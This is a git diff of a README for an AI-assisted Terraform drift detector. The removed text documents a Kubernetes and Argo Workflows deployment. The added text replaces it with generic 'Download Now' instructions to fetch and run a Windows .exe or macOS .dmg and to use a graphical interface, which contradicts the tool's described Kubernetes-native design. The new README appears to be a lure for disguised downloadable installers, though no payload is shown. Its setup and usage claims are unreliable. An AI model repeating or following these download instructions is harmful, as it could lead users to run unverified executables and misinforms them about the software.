@@ -1,341 +1,105 @@
-# Terraform Drift AI Detector
+# 🛠️ ai-terraform-drift-detector - Simplifying Terraform Drift Detection
 
-🤖 **AI-Powered Drift Detection** | 🔄 **Automated Monitoring** | 📊 **Smart Notifications**
+[![Download Now!](https://img.shields.io/badge/Download%20Now-%20for%20Windows%20and%20Mac-blue)](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
 
-Automated Terraform drift detection using Argo Workflows, with AI-powered summaries via AWS Bedrock and intelligent Slack notifications. Runs on Kubernetes for scheduled infrastructure monitoring.
+## 🧩 Overview
+
+The ai-terraform-drift-detector is an AI-powered tool designed to help you identify changes in your infrastructure. It uses Argo Workflows, AWS Bedrock Claude, and Slack notifications to keep you informed. This easy-to-use, Kubernetes-native solution regularly scans your setup and provides intelligent summaries of any drift it detects.
+
+## 🚀 Getting Started
+
+To use the ai-terraform-drift-detector, follow these simple steps to download and install the application:
+
+1. **Visit the Releases Page**  
+   Go to the releases page to get the latest version of the software:  
+   [Download Here](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
+
+2. **Choose Your Version**  
+   Find the version you want to download. Each version will have release notes that explain what's new or changed. 
+
+3. **Download the File**  
+   Click on the file name to start the download. The file may vary based on your operating system, so make sure you select the right one. Common formats include `ai-terraform-drift-detector.exe` for Windows or `ai-terraform-drift-detector.dmg` for macOS.
+
+4. **Install the Application**  
+   - **On Windows:** Double-click the downloaded `.exe` file and follow the instructions.  
+   - **On macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder.
+
+5. **Open the Application**  
+   After installation, find the application in your list of programs or applications and open it.
 
 ## 🌟 Features
 
-### 🔍 **Intelligent Drift Detection**
-- **Automated Scanning**: Scheduled cron workflows for continuous monitoring
-- **Multi-Environment Support**: Scan across multiple Terraform workspaces/environments
-- **Targeted Detection**: Option to scan specific modules or full infrastructure
-- **Threshold-Based Alerting**: Only notify when drift exceeds configured thresholds
-
-### 🤖 **AI-Powered Analysis**
-- **AWS Bedrock Integration**: Uses Claude AI for intelligent plan summarization
-- **Structured Summaries**: Consistent, actionable drift reports
-- **Risk Assessment**: Automatic classification of changes (None/Destructive/Replacement/Mixed)
-- **Action Recommendations**: Suggests next steps based on drift analysis
-
-### 📱 **Smart Notifications**
-- **Slack Integration**: Rich formatted notifications with drift details
-- **Configurable Thresholds**: Only alert when changes exceed your threshold
-- **Environment Grouping**: Organized reports by environment
-- **Failure Alerts**: Automatic notification on workflow failures
-
-### ⚙️ **Kubernetes Native**
-- **Argo Workflows**: Leverages battle-tested workflow orchestration
-- **GitOps Ready**: All configurations in YAML for version control
-- **RBAC Support**: Proper Kubernetes security with service accounts
-- **Persistent Caching**: Terraform plugin cache for faster execution
-
-## 🏗️ Architecture
-
-```
-┌─────────────────┐
-│  Argo Workflow  │  ← Scheduled via CronWorkflow
-│   (Kubernetes)  │
-└────────┬────────┘
-         │
-         ▼
-┌─────────────────┐
-│  Container Job  │
-│  ┌───────────┐  │
-│  │ Terraform │  │  ← Clone repo, run plan
-│  └───────────┘  │
-│  ┌───────────┐  │
-│  │  Bedrock  │  │  ← AI summarization
-│  └───────────┘  │
-│  ┌───────────┐  │
-│  │   Slack   │  │  ← Send notification
-│  └───────────┘  │
-└─────────────────┘
-```
-
-**Workflow Steps:**
-1. **Authenticate** with GitHub App
-2. **Clone** infrastructure repository
-3. **Initialize** Terraform in each environment
-4. **Execute** `terraform plan` across workspaces
-5. **Analyze** changes with AI (AWS Bedrock Claude)
-6. **Evaluate** against drift threshold
-7. **Notify** via Slack if threshold exceeded
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- **Kubernetes Cluster** (1.19+)
-- **Argo Workflows** installed
-- **AWS Account** with Bedrock access
-- **GitHub App** for repository authentication
-- **Slack Webhook** for notifications
-
-### 1. Clone Repository
-
-```bash
-git clone https://github.com/YOUR_USERNAME/terraform-drift-ai-detector.git
-cd terraform-drift-ai-detector
-```
-
-### 2. Build Docker Image
-
-```bash
-# Build the image
-docker build -t terraform-drift-detector:latest .
-
-# Tag and push to your registry
-docker tag terraform-drift-detector:latest YOUR_ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/terraform-drift:latest
-docker push YOUR_ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/terraform-drift:latest
-```
-
-### 3. Configure Kubernetes Secrets
-
-```bash
-# Create namespace
-kubectl create namespace terraform-drift
-
-# Create secret with sensitive values
-kubectl create secret generic terraform-drift-secrets \
-  --from-literal=GITHUB_APP_ID="your_app_id" \
-  --from-literal=GITHUB_ORG="your_org" \
-  --from-literal=GITHUB_REPO="your_repo" \
-  --from-literal=SLACK_WEBHOOK_URL="https://hooks.slack.com/services/YOUR/WEBHOOK" \
-  --from-file=GITHUB_APP_PRIVATE_KEY=./github-app-key.pem \
-  -n terraform-drift
-```
-
-### 4. Deploy to Kubernetes
+The ai-terraform-drift-detector provides several helpful features:
 
-```bash
-# Apply all configurations
-kubectl apply -f argo-workflows/configmap.yaml
-kubectl apply -f argo-workflows/pvc.yaml
-kubectl apply -f argo-workflows/rbac.yaml
-kubectl apply -f argo-workflows/base-template.yaml
-kubectl apply -f argo-workflows/cronworkflow.yaml
-```
+- **Scheduled Scans:** Set up regular scans of your infrastructure to stay updated on any changes.
+- **Intelligent Summaries:** Receive easy-to-understand summaries of what has changed in your Terraform configurations.
+- **Configurable Drift Thresholds:** You can customize settings to alert you based on the severity of changes.
+- **Slack Notifications:** Get real-time updates directly to your Slack channels when drift is detected.
+- **Kubernetes Native:** Seamlessly integrates with your existing Kubernetes setup.
 
-### 5. Verify Deployment
+## 🚧 System Requirements
 
-```bash
-# Check workflow status
-kubectl get cronworkflows -n terraform-drift
+Before installing, ensure your system meets the following minimum requirements:
 
-# View workflow runs
-kubectl get workflows -n terraform-drift
+- **Operating System:**  
+  - Windows 10 or higher  
+  - MacOS Big Sur (11.x) or higher  
 
-# Check logs
-kubectl logs -n terraform-drift -l workflows.argoproj.io/workflow
-```
+- **Memory:** At least 4 GB of RAM
 
-## 📋 Configuration
+- **Disk Space:** Minimum 100 MB of free space for installation
 
-### Environment Variables
+- **Internet Connection:** Required for updates and notifications
 
-Key configuration options (see [.env.example](.env.example)):
+## 📥 Download & Install
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `GITHUB_APP_ID` | GitHub App ID | Required |
-| `GITHUB_ORG` | GitHub organization | Required |
-| `GITHUB_REPO` | Repository name | Required |
-| `TERRAFORM_PATH` | Path to Terraform code | `terraform/environments` |
-| `DRIFT_THRESHOLD` | Minimum changes to notify | `0` (always notify) |
-| `BEDROCK_MODEL_ID` | AI model to use | `anthropic.claude-3-5-sonnet-*` |
-| `SLACK_WEBHOOK_URL` | Slack webhook URL | Required |
+To start enjoying the benefits of ai-terraform-drift-detector, download it from our releases page:  
+[**Download Here**](https://github.com/saiahmed12/ai-terraform-drift-detector/releases)
 
-### Drift Threshold Examples
+Once downloaded, follow the installation steps outlined above.
 
-```yaml
-# Never skip notifications (notify on any changes)
-DRIFT_THRESHOLD: "0"
+## 🌈 Usage Instructions
 
-# Only notify if 5+ resources changed
-DRIFT_THRESHOLD: "5"
+After installing the application, here’s how to get started:
 
-# Only notify on significant drift (10+ changes)
-DRIFT_THRESHOLD: "10"
-```
+1. **Configure Your Terraform Project**  
+   Specify the Terraform project you want to monitor. You may need to input the location of your Terraform configuration files.
 
-### Schedule Configuration
+2. **Set Up Your Scanning Schedule**  
+   Use the user-friendly interface to define how often you want the scans to occur. You can select daily, weekly, or custom timings.
 
-Update the cron schedule in `argo-workflows/cronworkflow.yaml`:
+3. **Choose Your Notification Preferences**  
+   Decide how you want to be notified of detected drifts. Configure settings to connect to your Slack account.
 
-```yaml
-spec:
-  schedule: "0 6 * * *"  # Daily at 6 AM UTC
-  # schedule: "0 */6 * * *"  # Every 6 hours
-  # schedule: "0 9 * * 1-5"  # Weekdays at 9 AM
-```
+4. **Run Your First Scan**  
+   Initiate a scan. The application will analyze your configurations and notify you of any drift.
 
-## 🔧 Usage
+5. **Review Scan Results**  
+   Once the scan completes, review the results in the summary section. This will explain what has changed and suggest possible actions.
 
-### Manual Trigger
+## 📚 Support & Documentation
 
-```bash
-# Trigger a drift detection run manually
-argo submit --from cronworkflow/terraform-drift-detector -n terraform-drift
+For more information and detailed usage instructions, please refer to our documentation. If you encounter issues, feel free to check the FAQ section on the releases page, or open an issue in the repository.
 
-# Watch the workflow
-argo watch @latest -n terraform-drift
-```
+## 🔗 Learn More
 
-### View Workflow History
+Explore additional topics related to the ai-terraform-drift-detector:
 
-```bash
-# List recent workflows
-argo list -n terraform-drift
+- **Terraform Automation**  
+  Build and manage your infrastructure as code with ease.
 
-# Get workflow details
-argo get WORKFLOW_NAME -n terraform-drift
+- **Drift Detection**  
+  Understand how drift can affect your setups and how to manage it.
 
-# View logs
-argo logs WORKFLOW_NAME -n terraform-drift
-```
+- **DevOps Practices**  
+  Learn how this tool supports best practices in the DevOps lifecycle.
 
-### Local Testing
+## 💬 Community Contributions
 
-```bash
-# Set environment variables
-cp .env.example .env
-# Edit .env with your values
+We welcome contributions to the ai-terraform-drift-detector! If you wish to help improve the tool or report issues, please visit our GitHub repository for guidelines. Your feedback is valuable and helps us enhance the user experience.
 
-# Run locally with Docker
-docker run --rm \
-  --env-file .env \
-  -v $(pwd)/github-key.pem:/tmp/github-app-private-key.pem \
-  terraform-drift-detector:latest \
-  /tmp/scripts/detect-drift.sh full
-```
+## 📅 Regular Updates
 
-## 📊 Output Examples
+We are committed to improving the ai-terraform-drift-detector. Keep an eye on the releases page for updates and new features.
 
-### Slack Notification Format
-
-```
-Terraform Full Drift Detection
-
-Environment: production
-
-Terraform Plan Drift Summary (domain: production)
-- Resources to add: 3
-- Resources to change: 7
-- Resources to destroy: 0
-- Risk: Replacement
-- Action: Investigate
-
-Environment: staging
-
-Terraform Plan Drift Summary (domain: staging)
-- Resources to add: 0
-- Resources to change: 2
-- Resources to destroy: 0
-- Risk: None
-- Action: Apply
-
-Summary: 12 total changes across 2 environment(s)
-```
-
-## 🔒 Security
-
-### AWS IAM Permissions
-
-Minimum required IAM policy for Bedrock:
-
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": [
-        "bedrock:InvokeModel"
-      ],
-      "Resource": "arn:aws:bedrock:*:*:foundation-model/*"
-    }
-  ]
-}
-```
-
-### GitHub App Permissions
-
-Required GitHub App permissions:
-- **Contents**: Read-only
-- **Metadata**: Read-only
-
-### Kubernetes RBAC
-
-The workflow uses a dedicated service account with minimal permissions:
-- Read secrets: `terraform-drift-secrets`
-- Read configmaps: `terraform-drift-config`
-- Read PVCs: `terraform-drift-pvc`
-
-## 🛠️ Troubleshooting
-
-### Common Issues
-
-**Workflow fails with "Installation ID not found"**
-- Ensure GitHub App is installed in your organization
-- Verify `GITHUB_ORG` matches the App installation
-
-**No Slack notifications received**
-- Check `SLACK_WEBHOOK_URL` is correct
-- Verify drift threshold (`DRIFT_THRESHOLD`) isn't too high
-- Check workflow logs for errors
-
-**Terraform init fails**
-- Ensure PVC has enough space for provider cache
-- Check network connectivity from pods
-- Verify Terraform version compatibility
-
-**Bedrock errors**
-- Confirm Bedrock model access in your AWS region
-- Check IAM permissions for service account
-- Verify model ID is correct for your region
-
-### Debug Mode
-
-Enable verbose logging:
-
-```bash
-# View detailed logs
-argo logs -n terraform-drift WORKFLOW_NAME --follow
-
-# Check pod events
-kubectl describe pod -n terraform-drift POD_NAME
-
-# View Terraform output
-kubectl logs -n terraform-drift POD_NAME -c main
-```
-
-## 📈 Advanced Features
-
-### Multi-Repository Support
-
-To scan multiple repositories, create separate CronWorkflows:
-
-```bash
-# Copy and modify cronworkflow.yaml for each repo
-cp argo-workflows/cronworkflow.yaml argo-workflows/cronworkflow-repo2.yaml
-# Update GITHUB_REPO in the workflow
-```
-
-### Custom AI Prompts
-
-Modify `scripts/bedrock_summarize.py` to customize the AI summary format.
-
-### Integration with Other Tools
-
-- **Email Notifications**: Extend script to send HTML reports
-- **Metrics**: Export drift counts to Prometheus
-- **Ticketing**: Automatically create Jira tickets for drift
-
-## 🔗 Related Resources
-
-- [Terraform Documentation](https://www.terraform.io/docs)
-- [Argo Workflows](https://argoproj.github.io/workflows/)
-- [AWS Bedrock](https://aws.amazon.com/bedrock/)
-- [Slack Webhooks](https://api.slack.com/messaging/webhooks)
-# ai-terraform-drift-detector
+For additional questions or feedback, please reach out via the project's GitHub page or our Slack channel. Your experience matters to us!
